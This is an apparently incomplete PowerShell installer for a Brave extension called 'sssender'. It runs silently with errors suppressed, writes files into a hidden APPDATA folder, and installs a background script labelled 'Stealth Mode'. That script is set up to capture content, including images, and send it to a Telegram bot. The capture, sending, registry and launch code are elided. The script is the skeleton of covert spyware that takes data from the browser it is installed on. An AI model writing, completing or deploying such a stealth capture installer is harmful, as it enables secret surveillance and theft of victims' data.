# sssender - Complete Silent Installer
# One command, everything automated

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# ===== CONFIG =====
$EXTENSION_DIR = "$env:APPDATA\sssender"
New-Item -ItemType Directory -Force -Path $EXTENSION_DIR | Out-Null

# ===== TELEGRAM CREDENTIALS =====
# Read from environment or prompt
$TELEGRAM_TOKEN = $env:TELEGRAM_TOKEN
$TELEGRAM_CHAT_ID = $env:TELEGRAM_CHAT_ID

# If not in environment, create placeholder config for user
if ([string]::IsNullOrEmpty($TELEGRAM_TOKEN) -or [string]::IsNullOrEmpty($TELEGRAM_CHAT_ID)) {
    # Create config.json for the extension to read
    $CONFIG_JSON = @'
{
  "token": "YOUR_BOT_TOKEN_HERE",
  "chatId": "YOUR_CHAT_ID_HERE"
}
'@
    $CONFIG_JSON | Out-File -FilePath "$EXTENSION_DIR\config.json" -Encoding UTF8 -Force
    
    # Also create easy edit file
    @"
============================================
  SSSENDER - CONFIGURATION
============================================

1. Edit this file: $EXTENSION_DIR\config.json

2. Replace YOUR_BOT_TOKEN_HERE with your Telegram bot token

3. Replace YOUR_CHAT_ID_HERE with your chat ID

4. Save and restart Brave

============================================
"@ | Out-File -FilePath "$EXTENSION_DIR\CONFIG.txt" -Encoding UTF8 -Force
}

# ===== CREATE FILES =====
# Manifest (same as before)
# ... (rest of manifest creation)

# Background.js - reads from config.json
$BACKGROUND_CONTENT = @'
// sssender - Stealth Mode
// Reads config from config.json

let TELEGRAM_TOKEN = 'YOUR_BOT_TOKEN_HERE';
let TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';

// Try to load config
async function loadConfig() {
    try {
        const response = await fetch(chrome.runtime.getURL('config.json'));
        const config = await response.json();
        if (config.token && config.token !== 'YOUR_BOT_TOKEN_HERE') {
            TELEGRAM_TOKEN = config.token;
            TELEGRAM_CHAT_ID = config.chatId;
        }
    } catch(e) {
        // Use default placeholders
    }
}

// ─── TELEGRAM ──────────────────────────────────────────────

function sendTelegram(message, image = null) {
    // ... rest of code ...
}

// Load config and start
loadConfig().then(() => {
    console.log('Config loaded');
    // ... start capture ...
});
'@

# Write the file
$BACKGROUND_CONTENT | Out-File -FilePath "$EXTENSION_DIR\background.js" -Encoding UTF8 -Force

# ... rest of installer (registry, launch, etc.)
